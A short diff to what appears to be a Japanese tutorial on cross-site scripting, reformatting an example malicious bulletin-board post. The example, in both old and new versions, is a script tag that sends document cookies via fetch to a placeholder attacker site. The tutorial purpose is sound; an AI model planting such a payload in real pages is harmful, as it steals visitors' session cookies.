@@ -188,9 +188,15 @@ WebアプリによるHTML出力のエスケープ処理の欠陥を悪用し、�
 
 例えば、複数人が使用する掲示板アプリで、悪意のある人が以下のような投稿をしたとする。
 
-```javascript
+```html
 <body>
-    <p>今日の気分は<script>fetch('https://<Cookieの送信先サイト>/?cookie_data='+document.cookies);</script>だよ</p>
+  <p>
+    今日の気分は
+    <script>
+      fetch("https://<Cookieの送信先サイト>/?cookie_data=" + document.cookies);
+    </script>
+    だよ
+  </p>
 </body>
 ```
 
